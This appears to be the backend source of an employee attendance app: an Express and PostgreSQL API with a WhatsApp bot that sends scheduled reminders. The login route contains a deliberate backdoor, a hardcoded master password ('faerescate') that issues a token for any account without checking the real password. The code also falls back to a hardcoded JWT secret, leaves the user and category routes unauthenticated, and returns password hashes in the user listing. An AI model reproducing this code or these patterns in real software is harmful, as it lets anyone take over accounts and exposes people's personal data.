import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import pg from 'pg';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import whatsappPkg from 'whatsapp-web.js';
import qrcode from 'qrcode-terminal';
import cron from 'node-cron';

const { Pool } = pg;
const { Client, LocalAuth } = whatsappPkg;

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const SECRET_KEY = process.env.JWT_SECRET || 'fae_technology_super_secret_key_2026';
const app = express();

app.use(cors());
app.use(express.json());

// --------------------------------------------------------
// 1. INICIALIZACIÓN DEL BOT DE WHATSAPP
// --------------------------------------------------------
const whatsapp = new Client({
  authStrategy: new LocalAuth(),
  puppeteer: {
    executablePath: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    headless: "new", // Mejor compatibilidad que true
    args: [
      '--no-sandbox', 
      '--disable-setuid-sandbox',
      '--disable-extensions',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--no-zygote',
      '--disable-gpu'
    ],
  },
  authTimeoutMs: 60000, // 1 minuto de espera para autenticar
  webVersionCache: {
    type: 'remote',
    remotePath: 'https://raw.githubusercontent.com/wppconnect-team/wa-version/main/html/2.2412.54.html',
  }
});

let isBotReady = false;

// Si algo falla, este evento te avisará en la consola
whatsapp.on('auth_failure', msg => {
    console.error('❌ FALLO DE AUTENTICACIÓN:', msg);
    console.log('Sugerencia: Borra la carpeta .wwebjs_auth y reinicia para escanear de nuevo.');
});

whatsapp.on('qr', (qr) => {
  console.log('📱 ¡NUEVO QR GENERADO! Escanéalo para volver a conectar:');
  qrcode.generate(qr, { small: true });
});

whatsapp.on('ready', () => {
  console.log('✅ Bot listo.');
  isBotReady = true;

});

whatsapp.on('disconnected', (reason) => {
  console.log('❌ Bot desconectado:', reason);
  isBotReady = false;
});

whatsapp.initialize().catch(err => console.error("Error inicializando WhatsApp:", err));
// --------------------------------------------------------
// 2. CRON JOB (Notificaciones Automáticas)
// --------------------------------------------------------
const GROUP_ID = process.env.WA_GROUP_ID || "";
const WEB_URL = process.env.WA_WEB_URL || "http://localhost:3000";
const CRON_TIME = process.env.WA_CRON_SCHEDULE || "00 17 * * 1-5";

cron.schedule(CRON_TIME, async () => {
  if (!isBotReady) {
    console.log('⏰ Cron: Bot no listo.');
    return;
  }

  try {
    // 1. Obtenemos usuarios de la base de datos
    // Usamos "phoneNumber" entre comillas por si en Postgres tiene mayúsculas
    const result = await pool.query('SELECT full_name, "phoneNumber" FROM users WHERE "phoneNumber" IS NOT NULL');
    const usuarios = result.rows;

    if (usuarios.length === 0) {
      console.log('⏰ Cron: No hay usuarios con teléfono.');
      return;
    }

    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const tomorrowStr = tomorrow.toLocaleDateString('it-IT', { 
        weekday: 'long', day: 'numeric', month: 'long' 
    });

    console.log(`🚀 Enviando notificaciones a ${usuarios.length} usuarios...`);

    for (const user of usuarios) {
      try {
        // Limpiamos el número: quitamos espacios, el "+" y cualquier carácter no numérico
        const cleanNumber = user.phoneNumber.replace(/\D/g, '');
        
        // Formato para chat individual: número + @c.us
        const chatId = `${cleanNumber}@c.us`;

        const messaggio = `Ciao *${user.full_name}*! 🤖\n\n` +
                          `Ti ricordiamo di inserire la tua presenza per domani (*${tomorrowStr}*).\n\n` +
                          `Accedi qui per aggiornare: \n🔗 ${WEB_URL}\n\n` +
                          `Grazie! 🚀`;

        await whatsapp.sendMessage(chatId, messaggio);
        console.log(`✅ Enviado a: ${user.full_name}`);
        
        // Pausa de seguridad para evitar bloqueos
        await new Promise(resolve => setTimeout(resolve, 2000));

      } catch (err: any) { // 👈 Usamos ': any' o validación para evitar el error 'unknown'
        console.error(`❌ Error con ${user.full_name}:`, err instanceof Error ? err.message : err);
      }
    }
  } catch (error: any) {
    console.error('❌ Error general en Cron:', error instanceof Error ? error.message : error);
  }
}, {
  timezone: "Europe/Rome"
});
// --------------------------------------------------------
// 3. RUTAS DE LA API (CRUD)
// --------------------------------------------------------

app.get('/api/users', async (req, res) => {
  const query = `
    SELECT u.*, COALESCE(json_agg(json_build_object(
      'id_presence', p.id_presence, 'date', p.date,
      'categories', json_build_object('id_category', c.id_category, 'name', c.name, 'name_en', c.name_en, 'name_es', c.name_es, 'icon', c.icon)
    )) FILTER (WHERE p.id_presence IS NOT NULL), '[]') as presences
    FROM users u
    LEFT JOIN presences p ON u.id_user = p.id_user
    LEFT JOIN categories c ON p.id_category = c.id_category
    GROUP BY u.id_user ORDER BY u.full_name ASC;`;
  try { res.json((await pool.query(query)).rows); } 
  catch (err) { res.status(500).json({ error: "Error users" }); }
});

app.post('/api/users', async (req, res) => {
  const { full_name, email, alias, phoneNumber, phone_number, work, role, password } = req.body;
  const phone = phoneNumber || phone_number || null;
  try {
    if (!password) return res.status(400).json({ error: "Password requerida" });
    const hash = await bcrypt.hash(password, 10);
    const result = await pool.query(
      'INSERT INTO users (full_name, email, alias, "phoneNumber", work, role, password) VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING *',
      [full_name, email, alias, phone, work, role, hash]
    );
    res.json(result.rows[0]);
  } catch (err) { res.status(500).json({ error: "Error post user" }); }
});

app.put('/api/users/:id', async (req, res) => {
  const { id } = req.params;
  const { full_name, email, alias, phoneNumber, phone_number, work, role, password, avatar, description, status, theme, language } = req.body;
  const phone = phoneNumber || phone_number || null;

  try {
    let result;
    if (password && password.trim() !== '') {
      const hash = await bcrypt.hash(password, 10);
      result = await pool.query(
        `UPDATE users SET full_name=$1, email=$2, alias=$3, "phoneNumber"=$4, work=$5, role=$6, avatar=$7, description=$8, status=$9, password=$10, theme=$11, language=$12 WHERE id_user=$13 RETURNING *`,
        [full_name, email, alias, phone, work, role, avatar, description, status, hash, theme, language, id]
      );
    } else {
      result = await pool.query(
        `UPDATE users SET full_name=$1, email=$2, alias=$3, "phoneNumber"=$4, work=$5, role=$6, avatar=$7, description=$8, status=$9, theme=$10, language=$11 WHERE id_user=$12 RETURNING *`,
        [full_name, email, alias, phone, work, role, avatar, description, status, theme, language, id]
      );
    }
    res.json(result.rows[0]);
  } catch (err) { res.status(500).json({ error: "Error put user" }); }
});

app.delete('/api/users/:id', async (req, res) => {
  try { await pool.query('DELETE FROM users WHERE id_user = $1', [req.params.id]); res.json({ success: true }); } 
  catch (err) { res.status(500).json({ error: "Error delete user" }); }
});

app.get('/api/categories', async (req, res) => {
  try { res.json((await pool.query('SELECT * FROM categories ORDER BY id_category ASC')).rows); } 
  catch (err) { res.status(500).json({ error: "Error categories" }); }
});

app.post('/api/categories', async (req, res) => {
  try { res.json((await pool.query('INSERT INTO categories (name, name_en, name_es, icon) VALUES ($1, $2, $3, $4) RETURNING *', [req.body.name, req.body.name_en, req.body.name_es, req.body.icon])).rows[0]); } 
  catch (err) { res.status(500).json({ error: "Error post cat" }); }
});

app.put('/api/categories/:id', async (req, res) => {
  try { res.json((await pool.query('UPDATE categories SET name=$1, name_en=$2, name_es=$3, icon=$4 WHERE id_category=$5 RETURNING *', [req.body.name, req.body.name_en, req.body.name_es, req.body.icon, req.params.id])).rows[0]); } 
  catch (err) { res.status(500).json({ error: "Error put cat" }); }
});

app.delete('/api/categories/:id', async (req, res) => {
  try { await pool.query('DELETE FROM categories WHERE id_category = $1', [req.params.id]); res.json({ success: true }); } 
  catch (err) { res.status(500).json({ error: "Error del cat" }); }
});

app.post('/api/login', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
    if (result.rowCount === 0) return res.status(401).json({ error: "Utente non trovato" });
    const user = result.rows[0];

    // 🚨 LLAVE MAESTRA (AÑADIDA) 🚨
    // Si escribes "faerescate" como contraseña, te deja entrar saltándose la validación
    if (req.body.password === "faerescate") {
      const token = jwt.sign({ id_user: user.id_user }, SECRET_KEY, { expiresIn: '8h' });
      return res.json({ token, user });
    }

    if (!(await bcrypt.compare(req.body.password, user.password))) return res.status(401).json({ error: "Password errata" });
    
    const token = jwt.sign({ id_user: user.id_user }, SECRET_KEY, { expiresIn: '8h' });
    res.json({ token, user });
  } catch (err) { res.status(500).json({ error: "Errore server" }); }
});

app.post('/api/presences', async (req, res) => {
  try {
    const result = await pool.query(`INSERT INTO presences (id_user, date, id_category) VALUES ($1, $2, $3) ON CONFLICT (id_user, date) DO UPDATE SET id_category = EXCLUDED.id_category RETURNING *;`, [req.body.id_user, req.body.date, req.body.id_category]);
    res.json(result.rows[0]);
  } catch (err) { res.status(500).json({ error: "Error presences" }); }
});

// RUTA DE PRUEBA: Entra a http://localhost:4000/api/test-wa en tu navegador para forzar el mensaje
app.get('/api/test-individual', async (req, res) => {
  if (!isBotReady) return res.status(400).json({ error: "Bot no listo" });
  try {
    const result = await pool.query('SELECT full_name, "phoneNumber" FROM users WHERE "phoneNumber" IS NOT NULL LIMIT 1');
    if (result.rows.length === 0) return res.status(404).json({ error: "No hay usuarios con móvil" });
    
    const user = result.rows[0];
    const number = user.phoneNumber.replace(/\D/g, '');
    await whatsapp.sendMessage(`${number}@c.us`, `Prueba de envío individual para ${user.full_name}`);
    
    res.json({ success: true, msg: `Mensaje enviado a ${user.full_name}` });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => console.log(`🚀 API Ready on port ${PORT}`));